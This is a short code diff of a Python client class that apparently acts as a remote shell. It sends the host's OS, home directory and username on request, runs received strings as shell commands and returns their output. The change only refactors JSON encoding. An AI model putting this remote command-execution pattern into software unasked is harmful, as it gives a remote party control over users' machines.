@@ -356,7 +356,7 @@ class Client(object):
                 continue
 
             if data[0] == '_INFO':
-                self.send(json.dumps([platform.system(), os.path.expanduser('~'), getpass.getuser()]).encode())
+                self.send(json_dumps([platform.system(), os.path.expanduser('~'), getpass.getuser()]))
                 continue
 
             if data[0] == 'FROZEN':
@@ -511,12 +511,12 @@ class Client(object):
                         # Command should only return one line (cwd)
                         if newlines > 1:
                             process = subprocess.Popen(data[1], shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-                            self.send(json.dumps(['ERROR', process.stdout.read().decode()]).encode())
+                            self.send(json_dumps(['ERROR', process.stdout.read().decode()]))
                         else:
                             os.chdir(output.strip())
-                            self.send(json.dumps([os.getcwd()]).encode())
+                            self.send(json_dumps([os.getcwd()]))
                     else:
-                        self.send(json.dumps(['ERROR', error]).encode())
+                        self.send(json_dumps(['ERROR', error]))
                     continue
 
                 process = subprocess.Popen(data[1], shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
